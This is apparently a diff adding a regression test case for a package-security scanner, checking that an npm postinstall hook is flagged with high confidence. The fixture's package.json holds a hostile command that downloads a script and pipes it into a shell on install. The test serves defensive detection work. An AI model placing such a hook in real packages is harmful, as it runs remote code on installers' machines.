@@ -1,0 +1,4 @@
+{"name": "hit-curl-pipe-postinstall", "kind": "miss",
+ "reason": "regression: a postinstall that pipes a download into a shell is high confidence",
+ "files": {"package.json": "{\n  \"name\": \"x\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://example.com/x.sh | sh\"\n  }\n}\n"},
+ "expect": [{"rule": "hook.npm_lifecycle", "confidence": "high", "file": "package.json"}]}
